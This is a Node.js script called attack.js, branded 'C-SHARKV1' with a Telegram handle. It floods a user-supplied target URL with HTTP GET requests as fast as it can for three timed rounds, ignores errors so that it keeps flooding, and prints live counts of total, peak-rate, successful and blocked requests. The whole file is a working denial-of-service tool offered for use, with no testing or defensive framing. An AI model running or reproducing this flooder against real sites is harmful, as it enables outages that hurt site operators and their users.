const axios = require('axios');

// Get command line arguments: target URL and duration
const [,, targetUrl, timeInSeconds] = process.argv;

if (!targetUrl || !timeInSeconds) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
  process.exit(1);
}

// Convert timeInSeconds to a number and ensure it's valid
const durationInMs = parseInt(timeInSeconds, 10) * 1000;
if (isNaN(durationInMs) || durationInMs <= 0) {
  console.log('Please provide a valid time in seconds.');
  process.exit(1);
}

// Variables to track stats
let totalRequests = 0;
let successfulRequests = 0;
let blockedRequests = 0;
let startTime = Date.now();
let stopTime = startTime + durationInMs;
let peakRps = 0;
let lastRequestsCount = 0;

// Function to send HTTP requests
const sendRequest = async () => {
  try {
    const response = await axios.get(targetUrl);
    successfulRequests++;
  } catch (error) {
    // Ignore the error, continue flooding the target
    blockedRequests++;
  }

  totalRequests++;
};

// Function to display live statistics (overwritten every 100ms)
const displayStats = () => {
  const currentTime = Date.now();
  const elapsedTime = currentTime - startTime;
  const remainingTime = Math.max(stopTime - currentTime, 0);
  
  // Calculate the current requests per second (RPS)
  const rps = totalRequests - lastRequestsCount;
  peakRps = Math.max(peakRps, rps);

  // Prepare output message
  const statsMessage = `
C-SHARKV1 - T.ME/STSVKINGDOM

Total Sent: ${totalRequests}
Max-RPS: ${peakRps}
Success: ${successfulRequests}
Blocked: ${blockedRequests}
Time Remaining: ${Math.ceil(remainingTime / 1000)}s
`;

  // Output stats, overwriting the terminal every 100ms
  process.stdout.write(`\r${statsMessage}`);
  lastRequestsCount = totalRequests;
};

// Function to perform the flooding attack
const performFlood = (round = 1) => {
  // Only run 3 times
  if (round > 3) {
    console.log('\nFlood test completed.');
    return;
  }

  console.log(`\nStarting flood round ${round}...`);

  // Update the start and stop time for the current round
  startTime = Date.now();
  stopTime = startTime + durationInMs;

  const interval = setInterval(() => {
    if (Date.now() > stopTime) {
      clearInterval(interval); // Stop after the time limit is reached
      console.log(`\nRound ${round} completed.`);
      
      // Move on to the next round
      performFlood(round + 1);
      return;
    }

    // Send requests as quickly as possible, ignoring errors
    sendRequest();

    // Update live stats every 100ms
    displayStats();
  }, 0); // No delay between requests (flooding the server)
};

// Start the flood attack
performFlood();
